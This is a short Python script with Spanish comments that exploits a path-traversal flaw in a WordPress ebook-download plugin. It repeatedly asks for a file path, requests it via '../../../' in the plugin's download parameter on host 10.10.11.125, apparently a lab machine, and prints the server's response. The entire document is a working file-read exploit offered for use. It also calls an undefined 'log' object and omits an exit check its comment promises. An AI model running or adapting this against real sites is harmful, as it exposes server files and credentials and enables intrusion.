#!/usr/bin/python3

import requests, sys, signal


# CTRL + C
def def_handler(sig, frame):
    log.failure("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


while True:
    # Espera a que ingreses una ruta desde la consola
    ruta = input("Path $> ")

    # Verifica si se ingresó 'salir' para terminar el bucle

    # Construye la URL utilizando la ruta proporcionada
    url = f"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../{ruta}"

    try:
        # Realiza la petición a la URL
        response = requests.get(url)

        # Imprime el contenido de la respuesta
        print("\nContenido de la respuesta:")
        print(response.text)
        print("\n")

    except requests.RequestException as e:
        print(f"Error al realizar la petición: {e}")
